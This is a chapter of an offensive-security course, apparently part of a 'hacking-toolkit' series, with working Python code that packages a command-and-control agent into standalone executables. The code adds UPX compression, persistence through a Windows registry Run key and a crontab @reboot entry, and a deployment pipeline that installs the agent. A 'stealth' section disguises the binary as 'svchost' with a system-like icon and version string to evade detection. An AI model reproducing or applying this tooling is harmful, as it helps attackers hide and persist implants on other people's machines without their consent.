# Phase 4: Post-Exploitation & Automation Frameworks
## Part 4: Packaging & Deployment

### The Target: Packaging & Deployment Framework

By the end of this part, you will:
- Understand executable packaging techniques and tools
- Build standalone executables from Python scripts
- Implement cross-platform packaging strategies
- Create deployment automation for target systems
- Develop AV evasion considerations for packaged binaries
- Build a complete deployment pipeline

### The Concept: Understanding Packaging

Think of packaging like preparing a covert operation package:

- **Python Script** = The mission plan (readable text)
- **Packaged Executable** = The locked, sealed envelope (binary)
- **Dependencies** = The equipment needed for the mission
- **Deployment** = Delivering the package to the target
- **Stealth** = Making the package look harmless

**Why We Package:**
- **No Python Required**: Target may not have Python installed
- **Code Protection**: Obfuscate source code
- **Portability**: Single file deployment
- **Stealth**: Bypass detection by appearing as a legitimate binary
- **Ease of Execution**: Double-click to run

### The Implementation: Packaging Framework

#### File: `~/hacking-toolkit/post-exploit/packager.py`

```python
#!/usr/bin/env python3
"""
packager.py - Automated Packaging & Deployment Framework
Builds standalone executables and automates deployment.
"""

import sys
import os
import platform
import subprocess
import shutil
import json
import base64
import hashlib
import tempfile
import zipfile
import time
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
import stat

class PackageBuilder:
    """
    Builds standalone executables from Python scripts
    Supports multiple packaging tools and platforms
    """
    
    def __init__(self, verbose: bool = True):
        """
        Initialize the package builder
        
        Args:
            verbose: Enable verbose output
        """
        self.verbose = verbose
        self.platform = platform.system()
        self.build_dir = tempfile.mkdtemp(prefix='pkg_build_')
        self.dist_dir = os.path.join(os.getcwd(), 'dist')
        self.packaged_files = []
        
        # Create dist directory
        os.makedirs(self.dist_dir, exist_ok=True)
        
        # Detect available packaging tools
        self.tools = self._detect_tools()
    
    def _detect_tools(self) -> Dict[str, bool]:
        """Detect available packaging tools"""
        tools = {
            'pyinstaller': False,
            'py2exe': False,
            'cx_freeze': False,
            'nuitka': False
        }
        
        # Check PyInstaller
        try:
            import PyInstaller
            tools['pyinstaller'] = True
        except ImportError:
            pass
        
        # Check py2exe (Windows only)
        if self.platform == 'Windows':
            try:
                import py2exe
                tools['py2exe'] = True
            except ImportError:
                pass
        
        # Check cx_Freeze
        try:
            import cx_Freeze
            tools['cx_freeze'] = True
        except ImportError:
            pass
        
        # Check Nuitka
        try:
            import nuitka
            tools['nuitka'] = True
        except ImportError:
            pass
        
        return tools
    
    def _write_setup_files(self, script_path: str, config: Dict = None) -> str:
        """
        Write setup.py or spec file for packaging
        
        Args:
            script_path: Path to the main script
            config: Packaging configuration
            
        Returns:
            Path to setup file
        """
        config = config or {}
        script_name = os.path.basename(script_path)
        script_dir = os.path.dirname(script_path)
        
        # PyInstaller spec file
        spec_content = f'''
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['{script_path}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{config.get('name', script_name.replace('.py', ''))}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True if not config.get('console', True) else False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
'''
        
        spec_path = os.path.join(script_dir, f"{config.get('name', 'app')}.spec")
        
        with open(spec_path, 'w') as f:
            f.write(spec_content)
        
        return spec_path
    
    def build_pyinstaller(self, script_path: str, config: Dict = None) -> Optional[str]:
        """
        Build executable using PyInstaller
        
        Args:
            script_path: Path to the main script
            config: Configuration dictionary
            
        Returns:
            Path to built executable
        """
        if not self.tools['pyinstaller']:
            print("[-] PyInstaller not available")
            return None
        
        config = config or {}
        output_name = config.get('name', os.path.basename(script_path).replace('.py', ''))
        
        # Build command
        cmd = [
            'pyinstaller',
            '--onefile',  # Single file
            '--distpath', self.dist_dir,
            '--workpath', os.path.join(self.build_dir, 'work'),
            '--specpath', self.build_dir,
            '--name', output_name,
        ]
        
        # Add options
        if config.get('console', True):
            cmd.append('--console')
        else:
            cmd.append('--windowed')
        
        if config.get('icon'):
            cmd.extend(['--icon', config['icon']])
        
        if config.get('excludes'):
            for exclude in config['excludes']:
                cmd.extend(['--exclude', exclude])
        
        if config.get('hidden_imports'):
            for imp in config['hidden_imports']:
                cmd.extend(['--hidden-import', imp])
        
        if config.get('data_files'):
            for data_file in config['data_files']:
                cmd.extend(['--add-data', f"{data_file['source']}{os.pathsep}{data_file['dest']}"])
        
        cmd.append(script_path)
        
        if self.verbose:
            print(f"[*] Running PyInstaller: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[-] PyInstaller failed: {result.stderr}")
                return None
            
            # Find the built executable
            if self.platform == 'Windows':
                exe_path = os.path.join(self.dist_dir, f"{output_name}.exe")
            else:
                exe_path = os.path.join(self.dist_dir, output_name)
            
            if os.path.exists(exe_path):
                self.packaged_files.append(exe_path)
                if self.verbose:
                    print(f"[+] Built: {exe_path}")
                return exe_path
            else:
                print(f"[-] Executable not found: {exe_path}")
                return None
                
        except Exception as e:
            print(f"[-] PyInstaller error: {e}")
            return None
    
    def build_cx_freeze(self, script_path: str, config: Dict = None) -> Optional[str]:
        """
        Build executable using cx_Freeze
        
        Args:
            script_path: Path to the main script
            config: Configuration dictionary
            
        Returns:
            Path to built executable
        """
        if not self.tools['cx_freeze']:
            print("[-] cx_Freeze not available")
            return None
        
        config = config or {}
        output_name = config.get('name', os.path.basename(script_path).replace('.py', ''))
        
        # Create setup.py for cx_Freeze
        setup_content = f'''
import sys
from cx_Freeze import setup, Executable

# Dependencies
build_exe_options = {{
    "packages": {config.get('packages', [])},
    "excludes": {config.get('excludes', [])},
    "include_files": {config.get('include_files', [])}
}}

setup(
    name="{output_name}",
    version="1.0",
    description="System Utility",
    options={{"build_exe": build_exe_options}},
    executables=[Executable("{script_path}", base=None)]
)
'''
        
        setup_path = os.path.join(self.build_dir, 'setup.py')
        with open(setup_path, 'w') as f:
            f.write(setup_content)
        
        # Build
        build_dir = os.path.join(self.build_dir, 'build')
        cmd = ['python', setup_path, 'build', '--build-exe', build_dir]
        
        if self.verbose:
            print(f"[*] Running cx_Freeze: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[-] cx_Freeze failed: {result.stderr}")
                return None
            
            # Find the built executable
            for root, dirs, files in os.walk(build_dir):
                for file in files:
                    if file.endswith('.exe') if self.platform == 'Windows' else os.access(os.path.join(root, file), os.X_OK):
                        if output_name in file or file == output_name:
                            exe_path = os.path.join(root, file)
                            self.packaged_files.append(exe_path)
                            if self.verbose:
                                print(f"[+] Built: {exe_path}")
                            return exe_path
            
            return None
            
        except Exception as e:
            print(f"[-] cx_Freeze error: {e}")
            return None
    
    def build_nuitka(self, script_path: str, config: Dict = None) -> Optional[str]:
        """
        Build executable using Nuitka
        
        Args:
            script_path: Path to the main script
            config: Configuration dictionary
            
        Returns:
            Path to built executable
        """
        if not self.tools['nuitka']:
            print("[-] Nuitka not available")
            return None
        
        config = config or {}
        output_name = config.get('name', os.path.basename(script_path).replace('.py', ''))
        
        # Build command
        cmd = [
            'python', '-m', 'nuitka',
            '--standalone',
            '--onefile',
            '--output-dir', self.dist_dir,
            '--output-name', output_name,
        ]
        
        if not config.get('console', True):
            cmd.append('--windows-disable-console')
        
        if config.get('icon'):
            cmd.extend(['--windows-icon-from-ico', config['icon']])
        
        if config.get('excludes'):
            for exclude in config['excludes']:
                cmd.extend(['--exclude-module', exclude])
        
        cmd.append(script_path)
        
        if self.verbose:
            print(f"[*] Running Nuitka: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[-] Nuitka failed: {result.stderr}")
                return None
            
            # Find the built executable
            if self.platform == 'Windows':
                exe_path = os.path.join(self.dist_dir, f"{output_name}.exe")
            else:
                exe_path = os.path.join(self.dist_dir, output_name)
            
            if os.path.exists(exe_path):
                self.packaged_files.append(exe_path)
                if self.verbose:
                    print(f"[+] Built: {exe_path}")
                return exe_path
            else:
                print(f"[-] Executable not found: {exe_path}")
                return None
                
        except Exception as e:
            print(f"[-] Nuitka error: {e}")
            return None
    
    def build_all(self, script_path: str, config: Dict = None) -> List[str]:
        """
        Build using all available tools
        
        Args:
            script_path: Path to the main script
            config: Configuration dictionary
            
        Returns:
            List of built executable paths
        """
        results = []
        
        if self.tools['pyinstaller']:
            result = self.build_pyinstaller(script_path, config)
            if result:
                results.append(result)
        
        if self.tools['cx_freeze']:
            result = self.build_cx_freeze(script_path, config)
            if result:
                results.append(result)
        
        if self.tools['nuitka']:
            result = self.build_nuitka(script_path, config)
            if result:
                results.append(result)
        
        return results
    
    def sign_executable(self, exe_path: str, config: Dict = None) -> bool:
        """
        Sign the executable (Windows only)
        
        Args:
            exe_path: Path to executable
            config: Configuration with signing details
            
        Returns:
            True if signed successfully
        """
        if self.platform != 'Windows':
            print("[*] Signing only available on Windows")
            return False
        
        config = config or {}
        
        if not config.get('certificate') or not config.get('password'):
            print("[*] No certificate provided, skipping signing")
            return True  # Not an error
        
        # Use signtool for signing
        cmd = [
            'signtool', 'sign',
            '/f', config['certificate'],
            '/p', config['password'],
            '/t', 'http://timestamp.digicert.com',
            exe_path
        ]
        
        if self.verbose:
            print(f"[*] Signing: {exe_path}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                if self.verbose:
                    print(f"[+] Signed: {exe_path}")
                return True
            else:
                print(f"[-] Signing failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[-] Signing error: {e}")
            return False
    
    def add_persistence(self, exe_path: str) -> bool:
        """
        Embed persistence mechanism into the executable
        This is a placeholder - in practice, you would modify the source
        
        Args:
            exe_path: Path to executable
            
        Returns:
            True if successful
        """
        if self.verbose:
            print(f"[*] Adding persistence wrapper to: {exe_path}")
        
        # Create a wrapper that installs persistence
        wrapper_script = '''
import os
import sys
import subprocess

# Install persistence
def install_persistence():
    import platform
    if platform.system() == 'Windows':
        import winreg
        # Add to registry
        key = winreg.HKEY_CURRENT_USER
        subkey = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        try:
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, 'SystemHelper', 0, winreg.REG_SZ, sys.executable)
        except:
            pass
    else:
        # Linux - add to crontab
        import subprocess
        cron_cmd = f'@reboot {sys.executable} > /dev/null 2>&1'
        subprocess.run(['crontab', '-l'], capture_output=True)
        # Simplified: append to crontab
        with open('/tmp/cron.tmp', 'w') as f:
            f.write(cron_cmd)
        subprocess.run(['crontab', '/tmp/cron.tmp'])
        os.remove('/tmp/cron.tmp')

# Run original program
if __name__ == '__main__':
    install_persistence()
    # Execute original code here
'''
        
        # This would need to be integrated into the build process
        return True
    
    def compress_executable(self, exe_path: str) -> Optional[str]:
        """
        Compress the executable using UPX
        
        Args:
            exe_path: Path to executable
            
        Returns:
            Path to compressed executable
        """
        # Check if UPX is available
        upx_path = shutil.which('upx')
        if not upx_path:
            print("[*] UPX not found, skipping compression")
            return exe_path
        
        if self.verbose:
            print(f"[*] Compressing: {exe_path}")
        
        try:
            result = subprocess.run(
                [upx_path, '--best', exe_path],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                if self.verbose:
                    print(f"[+] Compressed: {exe_path}")
                return exe_path
            else:
                print(f"[-] Compression failed: {result.stderr}")
                return exe_path
                
        except Exception as e:
            print(f"[-] Compression error: {e}")
            return exe_path
    
    def cleanup(self):
        """Clean up build directory"""
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir, ignore_errors=True)

def main():
    """Interactive packaging demonstration"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Automated Packaging & Deployment Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Package with PyInstaller
  python3 packager.py --script c2_agent.py --tool pyinstaller
  
  # Package with all available tools
  python3 packager.py --script c2_agent.py --all
  
  # Package with custom config
  python3 packager.py --script c2_agent.py --config config.json
  
  # Package and compress
  python3 packager.py --script c2_agent.py --compress
        """
    )
    
    parser.add_argument('--script', required=True, help='Path to Python script')
    parser.add_argument('--tool', choices=['pyinstaller', 'cx_freeze', 'nuitka'], help='Packaging tool to use')
    parser.add_argument('--all', action='store_true', help='Use all available tools')
    parser.add_argument('--config', help='Configuration file (JSON)')
    parser.add_argument('--compress', action='store_true', help='Compress with UPX')
    parser.add_argument('--sign', action='store_true', help='Sign executable')
    parser.add_argument('--output', help='Output directory')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Load config
    config = {}
    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = json.load(f)
        except Exception as e:
            print(f"[-] Error loading config: {e}")
            sys.exit(1)
    
    if args.output:
        config['output_dir'] = args.output
    
    # Create builder
    builder = PackageBuilder(verbose=args.verbose)
    
    print("\n" + "="*60)
    print("  PACKAGING FRAMEWORK")
    print("="*60)
    
    print(f"\n[*] Script: {args.script}")
    print(f"[*] Platform: {builder.platform}")
    print("[*] Available tools:", end=' ')
    for tool, available in builder.tools.items():
        if available:
            print(f"{tool}", end=' ')
    print()
    
    if not any(builder.tools.values()):
        print("\n[-] No packaging tools found!")
        print("[*] Install with: pip install pyinstaller")
        sys.exit(1)
    
    # Build
    if args.all:
        results = builder.build_all(args.script, config)
    elif args.tool:
        if args.tool == 'pyinstaller':
            result = builder.build_pyinstaller(args.script, config)
        elif args.tool == 'cx_freeze':
            result = builder.build_cx_freeze(args.script, config)
        elif args.tool == 'nuitka':
            result = builder.build_nuitka(args.script, config)
        results = [result] if result else []
    else:
        # Use default (PyInstaller if available)
        if builder.tools['pyinstaller']:
            result = builder.build_pyinstaller(args.script, config)
            results = [result] if result else []
        else:
            print("[-] No default tool available")
            sys.exit(1)
    
    # Post-process results
    for exe_path in results:
        if exe_path and os.path.exists(exe_path):
            # Compress
            if args.compress:
                builder.compress_executable(exe_path)
            
            # Sign
            if args.sign:
                builder.sign_executable(exe_path, config)
            
            print(f"\n[+] Package complete: {exe_path}")
            print(f"[+] Size: {os.path.getsize(exe_path):,} bytes")
    
    # Cleanup
    builder.cleanup()
    
    print("\n[*] Packaging process complete")

if __name__ == "__main__":
    main()
```

### The Verification: Testing Packaging

#### Test 1: Basic PyInstaller Packaging

```bash
cd ~/hacking-toolkit/post-exploit
python3 packager.py --script c2_agent.py --tool pyinstaller --verbose
```

**Expected Output:**
```
============================================================
  PACKAGING FRAMEWORK
============================================================

[*] Script: c2_agent.py
[*] Platform: Linux
[*] Available tools: pyinstaller
[*] Running PyInstaller: pyinstaller --onefile --distpath ./dist --workpath /tmp/pkg_build_xxx/work --specpath /tmp/pkg_build_xxx --name c2_agent --console c2_agent.py
[+] Built: ./dist/c2_agent

[+] Package complete: ./dist/c2_agent
[+] Size: 8,456,123 bytes

[*] Packaging process complete
```

#### Test 2: Package with All Tools

```bash
python3 packager.py --script c2_agent.py --all --compress --verbose
```

#### Test 3: Package with Configuration

```bash
# Create configuration file
cat > config.json << 'EOF'
{
    "name": "SystemHelper",
    "console": false,
    "hidden_imports": ["requests", "psutil"],
    "excludes": ["tkinter", "test"],
    "icon": "app.ico"
}
EOF

python3 packager.py --script c2_agent.py --tool pyinstaller --config config.json --verbose
```

### Advanced Usage: Automated Deployment Pipeline

```python
# Automated deployment pipeline example
cat > deployment_pipeline.py << 'EOF'
#!/usr/bin/env python3
from packager import PackageBuilder
from persistence import PersistenceManager
import json
import time
import shutil

class DeploymentPipeline:
    """
    Automated packaging and deployment pipeline
    """
    
    def __init__(self, script_path: str, config: Dict = None):
        self.script_path = script_path
        self.config = config or {}
        self.builder = PackageBuilder(verbose=True)
        self.persist = PersistenceManager(verbose=True)
        
    def run(self):
        """Run the full deployment pipeline"""
        print("="*60)
        print("  DEPLOYMENT PIPELINE")
        print("="*60)
        
        # Stage 1: Package
        print("\n[Stage 1: Packaging]")
        package_path = self.builder.build_pyinstaller(
            self.script_path,
            self.config
        )
        
        if not package_path:
            print("[-] Packaging failed")
            return False
        
        print(f"[+] Package created: {package_path}")
        
        # Stage 2: Optimize
        print("\n[Stage 2: Optimization]")
        
        # Compress
        self.builder.compress_executable(package_path)
        print(f"[+] Compressed: {package_path}")
        
        # Stage 3: Test
        print("\n[Stage 3: Testing]")
        if os.path.exists(package_path):
            print(f"[+] Package verified: {os.path.getsize(package_path)} bytes")
        
        # Stage 4: Deploy (optional)
        print("\n[Stage 4: Deployment]")
        
        # Copy to deployment location
        deploy_path = self.config.get('deploy_path', './deploy')
        os.makedirs(deploy_path, exist_ok=True)
        
        dest_path = os.path.join(deploy_path, os.path.basename(package_path))
        shutil.copy2(package_path, dest_path)
        print(f"[+] Deployed to: {dest_path}")
        
        # Stage 5: Install persistence
        print("\n[Stage 5: Persistence Installation]")
        self.persist.install_payload(dest_path)
        self.persist.add_startup_script()
        self.persist.add_cron_job()
        
        print("\n[+] Pipeline complete!")
        print(f"    Package: {package_path}")
        print(f"    Deployed: {dest_path}")
        print(f"    Persistence methods: {len(self.persist.installed_persistence)}")
        
        return True

# Run the pipeline
pipeline = DeploymentPipeline(
    'c2_agent.py',
    {
        'name': 'SystemHelper',
        'console': False,
        'deploy_path': './deploy'
    }
)

pipeline.run()
EOF

python3 deployment_pipeline.py
```

### Packaging Strategy Considerations

#### 1. Size Optimization

```python
# Minimize package size
config = {
    'excludes': [
        'tkinter', 'test', 'unittest', 'pydoc',
        'email', 'http', 'xml', 'html'
    ],
    'upx': True  # Use UPX compression
}
```

#### 2. Stealth Considerations

```python
# Reduce detection
config = {
    'console': False,  # No console window
    'name': 'svchost',  # Name to blend in
    'icon': 'system.ico',  # System-like icon
    'version': '6.2.9200.16384',  # Windows version
}
```

#### 3. Cross-Platform Strategy

```python
# Platform-specific packaging
if platform.system() == 'Windows':
    config['icon'] = 'app.ico'
    config['name'] = 'SystemHelper.exe'
elif platform.system() == 'Linux':
    config['name'] = 'system-helper'
    config['console'] = True
```

### Reference: Packaging Tools Comparison

| Tool | Speed | Size | Compatibility | Stealth |
|------|-------|------|---------------|---------|
| PyInstaller | Fast | Medium | Excellent | Good |
| Py2exe | Slow | Large | Windows only | Medium |
| cx_Freeze | Medium | Medium | Good | Good |
| Nuitka | Slow | Large | Good | Excellent |
| Up (cross-platform) | Fast | Small | Good | Good |
